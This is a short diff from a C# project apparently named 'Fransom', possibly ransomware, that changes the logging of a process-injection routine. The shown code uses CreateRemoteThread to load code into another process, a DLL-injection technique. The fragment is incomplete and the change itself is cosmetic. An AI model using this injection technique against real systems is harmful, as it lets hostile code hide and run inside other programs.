@@ -43,11 +43,11 @@ namespace Fransom
             // Create a thread that will call LoadLibraryA with allocMemAddress as argument
             if (CreateRemoteThread(process_handle, IntPtr.Zero, 0, memory_allocation_variable, IntPtr.Zero, 0, IntPtr.Zero) != IntPtr.Zero)
             {
-                Console.WriteLine("Injection done!");
+                Logger.WriteLine("Injection done!");
             }
             else
             {
-                Console.WriteLine("Injection failed!");
+                Logger.WriteLine("Injection failed!");
             }
         }
     }
